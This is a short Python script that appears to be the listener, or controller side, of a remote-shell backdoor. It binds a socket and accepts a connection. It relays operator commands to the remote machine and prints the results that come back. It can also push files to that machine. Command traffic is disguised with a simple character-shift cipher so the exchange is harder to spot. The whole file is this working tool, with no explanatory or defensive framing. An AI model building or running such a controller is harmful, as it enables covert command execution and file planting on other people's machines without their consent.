#!/usr/bin/python3
import socket
import sys
import time
import _thread

def ftrans(sck,fname):

	fhandle=open(fname,'rb')

	data=fhandle.read()

	data_len=len(data)

	print("Sending "+str(data_len)+" bytes of data.")

	sck.send(str.encode(fname))

	sck.send(str.encode(str(data_len)))

	time.sleep(5)

	sck.send(data)

	print("Data sent.")

	fhandle.close()

if(len(sys.argv)!=3):

	print("Usage "+sys.argv[0]+" <ip> <port>")

	exit()

def dec(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec-4)

		newbuf+=char

	return newbuf

def enc(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec+4)

		newbuf+=char

	return newbuf

def smake():

    try:

        global host

        global port

        global s

        host=sys.argv[1]

        port=int(sys.argv[2])

        s=socket.socket()

    except socket.error as msg:
        print(str(msg))

def sbind():

    try:

        global host

        global port

        global s

        print("Binding to: "+str(port))

        s.bind((host,port))

        s.listen(5)
        
    except socket.error as msg:

        print(str(msg))

def saccept():

    try:

        global c,addr

        c,addr=s.accept()

        print("Connected: "+addr[0]+":"+str(addr[1]))

        passcmd()

        c.close()

    except socket.error as msg:

        print(str(msg))

def passcmd():

    global c

    while True:

        cmd=input()

        if cmd=='quit':

            c.send(str.encode(enc(cmd)))

            c.close()

            sys.exit()

        elif cmd[:6]=="ftrans":

            c.send(str.encode(enc("ftrans")))

            ftrans(c,cmd[7:])

        elif len(str.encode(cmd))>0:

            c.send(str.encode(enc(cmd)))

            crecv=dec(str(c.recv(2**24),"utf-8"))

            print(crecv, end="")

def main():

    smake()
    sbind()
    saccept()

main()
